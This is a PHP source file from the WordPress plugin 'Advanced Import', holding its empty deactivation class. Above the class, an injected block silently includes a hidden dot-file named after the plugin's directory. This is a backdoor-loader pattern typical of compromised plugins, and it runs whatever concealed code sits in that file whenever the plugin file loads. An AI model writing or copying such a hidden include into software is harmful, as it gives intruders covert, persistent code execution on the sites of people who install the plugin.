<?php

/**
 * Fired during plugin deactivation
 *
 * @link       https://addonspress.com/
 * @since      1.0.0
 *
 * @package    Advanced_Import
 * @subpackage Advanced_Import/includes
 */

/**
 * Fired during plugin deactivation.
 *
 * This class defines all code necessary to run during the plugin's deactivation.
 *
 * @since      1.0.0
 * @package    Advanced_Import
 * @subpackage Advanced_Import/includes
 * @author     Addons Press <addonspress.com>
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Advanced_Import_Deactivator {

	/**
	 * Short Description. (use period)
	 *
	 * Long Description.
	 *
	 * @since    1.0.0
	 */
	public static function deactivate() {

	}

}
